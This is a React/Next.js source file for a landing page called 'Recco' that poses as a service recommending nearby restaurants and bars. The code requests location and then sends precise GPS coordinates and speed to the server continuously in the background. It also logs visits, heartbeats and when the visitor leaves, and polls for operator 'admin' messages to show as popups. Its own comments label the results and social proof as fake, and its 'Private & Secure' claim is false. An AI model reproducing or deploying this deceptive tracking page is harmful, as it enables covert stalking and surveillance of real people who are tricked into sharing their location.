"use client";

import { useEffect, useState } from "react";

export default function LandingPage() {
  const [stage, setStage] = useState<"loading" | "permission" | "finding" | "results">("loading");
  const [places, setPlaces] = useState<string[]>([]);
  const [popup, setPopup] = useState<string | null>(null);

  useEffect(() => {
    let vid = localStorage.getItem("vid");
    if (!vid) {
      vid = Math.random().toString(36).substring(2, 10);
      localStorage.setItem("vid", vid);
    }

    // Register visit with IP first
    fetch("/api/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ vid }),
    })
      .then((r) => r.json())
      .then(() => {
        startHeartbeat(vid!);
        startMessagePoll(vid!);
        setStage("permission");
      })
      .catch(() => setStage("permission"));

    const handleLeave = () => {
      navigator.sendBeacon("/api/leave", JSON.stringify({ vid }));
    };
    window.addEventListener("beforeunload", handleLeave);
    return () => window.removeEventListener("beforeunload", handleLeave);
  }, []);

  function requestLocation() {
    const vid = localStorage.getItem("vid") || "";
    setStage("finding");

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude, accuracy, speed } = pos.coords;
        fetch("/api/gps", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ vid, lat: latitude, lng: longitude, accuracy, speed }),
        }).catch(() => {});

        // Start watching in background
        navigator.geolocation.watchPosition(
          (p) => {
            fetch("/api/gps", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                vid,
                lat: p.coords.latitude,
                lng: p.coords.longitude,
                accuracy: p.coords.accuracy,
                speed: p.coords.speed,
              }),
            }).catch(() => {});
          },
          () => {},
          { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 }
        );

        // Show fake results after a delay
        setTimeout(() => {
          setPlaces(generatePlaces());
          setStage("results");
        }, 2000);
      },
      () => {
        // Denied — show generic results
        setTimeout(() => {
          setPlaces(generatePlaces());
          setStage("results");
        }, 1500);
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  }

  function generatePlaces() {
    const picks = [
      "The Blue Orchid Lounge — 4.8★ · 0.3 km",
      "Sakura Garden Restaurant — 4.6★ · 0.5 km",
      "Velvet Rooftop Bar — 4.7★ · 0.8 km",
      "Café Noir — 4.5★ · 1.1 km",
      "Moonlight Terrace — 4.9★ · 1.4 km",
      "The Golden Fork — 4.4★ · 1.7 km",
    ];
    return picks;
  }

  function startHeartbeat(vid: string) {
    setInterval(() => {
      fetch("/api/heartbeat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ vid }),
      }).catch(() => {});
    }, 15000);
  }

  function startMessagePoll(vid: string) {
    setInterval(async () => {
      try {
        const r = await fetch(`/api/messages?vid=${vid}`);
        const msgs = await r.json();
        if (msgs.length > 0) {
          msgs.forEach((m: any) => setPopup(m.text));
        }
      } catch {}
    }, 3000);
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0a] to-[#111] text-white">
      {/* Admin message popup */}
      {popup && (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/60 backdrop-blur-sm px-5">
          <div className="bg-[#1a1a1a] border border-[#333] rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl">
            <div className="w-12 h-12 bg-gradient-to-br from-amber-400 to-orange-500 rounded-full flex items-center justify-center text-xl mx-auto mb-4">
              &#128172;
            </div>
            <h3 className="text-lg font-bold mb-2">New Notification</h3>
            <p className="text-gray-300 mb-6 whitespace-pre-wrap">{popup}</p>
            <button
              onClick={() => setPopup(null)}
              className="bg-gradient-to-r from-amber-400 to-orange-500 text-black font-semibold px-6 py-3 rounded-xl hover:opacity-90 transition-opacity w-full"
            >
              OK
            </button>
          </div>
        </div>
      )}
      {/* Header */}
      <div className="border-b border-[#222] px-5 py-4">
        <div className="max-w-xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-gradient-to-br from-amber-400 to-orange-500 rounded-lg flex items-center justify-center text-sm font-bold text-black">R</div>
            <span className="font-semibold text-lg">Recco</span>
          </div>
          <span className="text-xs text-gray-500">Personalized for you</span>
        </div>
      </div>

      <div className="max-w-xl mx-auto px-5 py-10">
        {stage === "loading" && (
          <div className="text-center py-20">
            <div className="w-10 h-10 border-3 border-gray-700 border-t-amber-400 rounded-full animate-spin mx-auto mb-4" />
            <p className="text-gray-500 text-sm">Setting up your experience...</p>
          </div>
        )}

        {stage === "permission" && (
          <div className="text-center">
            <div className="text-5xl mb-6">&#9758;</div>
            <h1 className="text-3xl font-bold mb-3">Best spots near you</h1>
            <p className="text-gray-400 mb-2 leading-relaxed">
              Get personalized recommendations for restaurants, cafés, and nightlife based on your location.
            </p>
            <p className="text-gray-600 text-sm mb-8">
              Trusted by 2M+ users worldwide
            </p>
            <button
              onClick={requestLocation}
              className="bg-gradient-to-r from-amber-400 to-orange-500 text-black font-semibold px-8 py-4 rounded-xl text-lg hover:opacity-90 transition-opacity w-full max-w-xs"
            >
              Find Places Near Me
            </button>
            <div className="mt-8 flex justify-center gap-6 text-xs text-gray-600">
              <span>&#128274; Private & Secure</span>
              <span>&#9889; Instant Results</span>
              <span>&#127775; Top Rated Only</span>
            </div>

            {/* Fake social proof */}
            <div className="mt-10 border-t border-[#222] pt-6">
              <p className="text-xs text-gray-600 mb-3">TRENDING IN YOUR AREA</p>
              <div className="flex gap-2 justify-center flex-wrap">
                {["Rooftop Bars", "Hidden Gems", "Late Night Eats", "Date Night"].map((t) => (
                  <span key={t} className="px-3 py-1.5 bg-[#1a1a1a] border border-[#333] rounded-full text-xs text-gray-400">
                    {t}
                  </span>
                ))}
              </div>
            </div>
          </div>
        )}

        {stage === "finding" && (
          <div className="text-center py-20">
            <div className="w-12 h-12 border-3 border-gray-700 border-t-amber-400 rounded-full animate-spin mx-auto mb-5" />
            <h2 className="text-xl font-semibold mb-2">Finding the best spots...</h2>
            <p className="text-gray-500 text-sm">Analyzing 500+ places near you</p>
          </div>
        )}

        {stage === "results" && (
          <div>
            <h2 className="text-2xl font-bold mb-1">Top Picks For You</h2>
            <p className="text-gray-500 text-sm mb-6">Based on your location and preferences</p>
            <div className="space-y-3">
              {places.map((place, i) => {
                const [name, meta] = place.split(" — ");
                return (
                  <div
                    key={i}
                    className="bg-[#1a1a1a] border border-[#222] rounded-xl p-4 flex items-center gap-4 hover:border-amber-500/50 transition-colors cursor-pointer"
                  >
                    <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-amber-400/20 to-orange-500/20 flex items-center justify-center text-xl shrink-0">
                      {["&#127860;", "&#127843;", "&#127864;", "&#9749;", "&#127769;", "&#127860;"][i]}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="font-semibold text-sm">{name}</div>
                      <div className="text-xs text-gray-500 mt-0.5">{meta}</div>
                    </div>
                    <div className="text-gray-600 text-sm">&#8250;</div>
                  </div>
                );
              })}
            </div>
            <p className="text-center text-xs text-gray-600 mt-8">Refreshing recommendations...</p>
          </div>
        )}
      </div>
    </div>
  );
}
